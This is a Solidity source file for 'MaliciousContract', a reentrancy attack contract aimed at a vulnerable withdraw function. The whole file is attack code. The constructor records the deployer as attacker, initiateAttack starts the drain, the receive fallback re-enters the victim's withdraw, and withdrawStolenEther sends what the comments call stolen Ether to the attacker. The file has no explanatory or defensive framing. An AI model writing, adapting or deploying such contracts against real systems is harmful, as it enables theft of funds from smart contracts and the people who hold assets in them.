pragma solidity ^0.8.4;

interface IReceiver {
    function withdraw(uint256 amount, address recipient) external;
}

contract MaliciousContract {
    IReceiver public receiverContract;
    address public attacker;

    constructor(address _receiverContract) {
        receiverContract = IReceiver(_receiverContract);
        attacker = msg.sender;
    }

    // This function will be called after the attack is initiated
    receive() external payable {
        // Perform the reentrancy attack by repeatedly calling the vulnerable function
        receiverContract.withdraw(msg.sender.balance, attacker);
    }

    // Start the reentrancy attack
    function initiateAttack() public payable {
        require(msg.value > 0, "Send some Ether to initiate the attack");
        // Call the vulnerable function to start the reentrancy attack
        receiverContract.withdraw(1 ether, address(this));
    }

    // Function to withdraw any stolen Ether
    function withdrawStolenEther() public {
        require(attacker == msg.sender, "Only the attacker can withdraw stolen Ether");
        payable(attacker).transfer(address(this).balance);
    }
}